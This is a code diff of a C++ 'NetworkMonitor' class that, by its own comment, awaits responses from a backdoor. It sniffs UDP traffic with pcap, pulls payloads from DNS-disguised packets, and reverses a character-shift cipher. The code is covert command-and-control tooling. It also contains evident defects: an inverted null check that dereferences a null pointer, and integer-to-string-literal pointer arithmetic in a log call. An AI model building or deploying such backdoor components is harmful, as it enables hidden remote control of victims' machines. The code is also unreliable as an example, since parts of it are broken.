@@ -12,25 +12,27 @@
 
 NetworkMonitor * NetworkMonitor::instance = nullptr;
 
-NetworkMonitor::NetworkMonitor()
+NetworkMonitor::NetworkMonitor(int cypherOffset)
 {
+    this->cypherOffset = cypherOffset;
     this->listenInterface = nullptr;
     this->currentFD = nullptr;
     this->data = nullptr;
 }
 
-NetworkMonitor * NetworkMonitor::getInstance()
+NetworkMonitor * NetworkMonitor::getInstance(int cypherOffset)
 {
     if(NetworkMonitor::instance == nullptr){
-        NetworkMonitor::instance = new NetworkMonitor();
+        NetworkMonitor::instance = new NetworkMonitor(cypherOffset);
     }
     return NetworkMonitor::instance;
 }
 
-
+/**
+ * This will await the response of the backdoor
+ */
 std::string NetworkMonitor::getResponse()
 {
-    std::string response;
     char errbuf[PCAP_ERRBUF_SIZE];
     bpf_u_int32 subnetMask;
     bpf_u_int32 ip;
@@ -66,12 +68,22 @@ std::string NetworkMonitor::getResponse()
     if(this->data == nullptr){
         return this->data->c_str();
     }else{
-        return (*this->data);
+        std::string data = this->data->c_str();
+        std::string encryptedPayload;
+        for(unsigned int i = 0; i < data.length(); i++)
+        {
+            char c = data[i];
+            encryptedPayload += (c - (this->cypherOffset));
+        }
+        return encryptedPayload;
     }
 }
 
-bool NetworkMonitor::getInterface(){
-
+/**
+ * This will get the pcap listen interfaces
+ */
+bool NetworkMonitor::getInterface()
+{
     Logger::debug("Main:getInterfaces - Initializing");
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -102,9 +114,12 @@ bool NetworkMonitor::getInterface(){
     return false; //This will happen if the right interface can never be found
 }
 
+/**
+ * This will process the reply and break down the packet into the response.
+ */
 void NetworkMonitor::processPayload(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
 {
-    Logger::debug("Packet reviced");
+    Logger::debug("Packet received");
 
     char * ptr;
 
@@ -112,15 +127,15 @@ void NetworkMonitor::processPayload(u_char *ptrnull, const struct pcap_pkthdr *p
     struct sniff_ip * ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
     u_int size_ip = IP_HL(ip) * 4;
     struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);
-    u_char * payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + 8);
+    u_char * payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + sizeof(DNS_HEADER) - 2);
 
     Logger::debug("Structures Found Over Packet");
-    //check if it is our packet - has dest port of 4378
     short destinationPort = ntohs(udp->uh_dport);
-    printf("%d\n", destinationPort);
+    Logger::debug("Dst port:" + destinationPort);
+
 
     //if our packet. parse what we know out of it
-    printf("%s\n", payload);
+    //    printf("%s\n", payload);
 
     NetworkMonitor::instance->data = new string((char *)payload);
     NetworkMonitor::instance->killListening();
